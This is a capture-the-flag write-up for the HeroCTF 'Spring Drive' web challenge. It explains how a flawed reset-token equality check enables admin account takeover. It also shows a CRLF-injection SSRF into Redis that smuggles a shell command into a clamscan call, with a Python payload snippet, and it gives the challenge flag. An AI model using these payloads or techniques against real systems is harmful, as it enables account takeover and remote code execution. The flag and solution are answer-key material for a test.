# Spring Drive

### Category

Web

### Difficulty

Hard

### Tags

- java

### Author

xanhacks

### Description

Find a way to achieve remote code execution in this Java Spring application.

Deploy an instance at [https://deploy.heroctf.fr/](https://deploy.heroctf.fr/).

### Files

- [spring_drive.zip](spring_drive.zip)

### Write Up

#### Account Takeover via Password Reset Token

The `admin` account can be compromised by exploiting a vulnerability in the password reset feature. The `getUserFromResetPasswordToken` method is flawed because it fails to validate the user ID and instead relies on a `contains` check to verify the reset password token's validity.

```java
public int getUserFromResetPasswordToken(String email, String uniqueToken) {
    ResetPasswordToken resetPasswordToken = new ResetPasswordToken(uniqueToken, email);
    if (resetPasswordTokens.contains(resetPasswordToken)) {
        return Integer.parseInt(uniqueToken.split("\\|")[1]);
    }
    return -1;
}
```

Internally, Java's `ArrayList.contains` method invokes `equals` on each list item. If any `equals` call returns `true`, the method returns `true`. Since the list contains `ResetPasswordToken` objects, the behavior depends on the `ResetPasswordToken.equals` implementation:

```java
public class ResetPasswordToken {
    @Override
    public boolean equals(Object o) {
        return this.token.split("\\|")[0].equals(((ResetPasswordToken) o).token.split("\\|")[0])
               && this.hashCode() == o.hashCode();
    }

    @Override
    public int hashCode() {
        return token.hashCode() + email.hashCode();
    }
}
```

To forge a valid reset password token for user `1` (admin), an attacker can:

1. Request a reset token for their own account.
2. Adjust the `hashCode` of the fake email by modifying its last character.

For example, these two tokens are considered equal:

```
ResetPasswordToken [token=061f36e2-440d-4df7-90a9-7749ba90e3b1|5, email=90d26e11a1d2abfb@example.comA]
ResetPasswordToken [token=061f36e2-440d-4df7-90a9-7749ba90e3b1|1, email=90d26e11a1d2abfb@example.comE]
```

#### Remote Code Execution via SSRF + Redis Queue Exploitation

A **CRLF injection** vulnerability in the HTTP method used by `okhttp3` allows attackers to inject Redis commands directly into the HTTP/TCP request. This can be exploited to manipulate the Redis queue `clamav_queue`, which is managed by the `ClamAVService` class.

The `ClamAVService` class runs the following method every minute:

```java
@Scheduled(fixedRate = 60 * 1000)
public void scanAllFiles() {
    logger.info("Scanning all files...");
    while (!this.isEmpty()) {
        String filePath = this.dequeue();
        logger.info("Scanning file {}...", filePath);
        if (!this.isFileClean(filePath)) {
            try {
                Files.deleteIfExists(Paths.get(filePath));
            } catch (IOException ignored) {
                logger.error("Unable to delete the file {}", filePath);
            }
        }
    }
}
```

The `isFileClean` method is vulnerable to **command injection**:

```java
public boolean isFileClean(String filePath) {
    String command = String.format("clamscan --quiet '%s'", filePath);
    ProcessBuilder processBuilder = new ProcessBuilder("/bin/sh", "-c", command);
    try {
        Process process = processBuilder.start();
        return process.waitFor() == 0;
    } catch (Exception ignored) {
        logger.error("Unable to scan the file {}", filePath);
    }
    return false;
}
```

By exploiting the CRLF injection, you can push a malicious entry into the Redis queue (`clamav_queue`). For example:

```python
REDIS_HOST = "localhost"
REDIS_QUEUE = "clamav_queue"

command = "cp /app/flag* /usr/share/nginx/html/flag.txt"
redis_ssrf = f"""RPUSH {REDIS_QUEUE} "/etc/hosts'; {command} #"\n"""
remote_upload(sess, f"http://{REDIS_HOST}:6379", "image.png", redis_ssrf)
```

This injects a fake entry into the queue, which triggers a **command injection** in the vulnerable `isFileClean` method.

For a full exploitation example, refer to [solve.py](solve.py).

### Flag

Hero{8be9845ab07c17c7f0c503feb0d91184}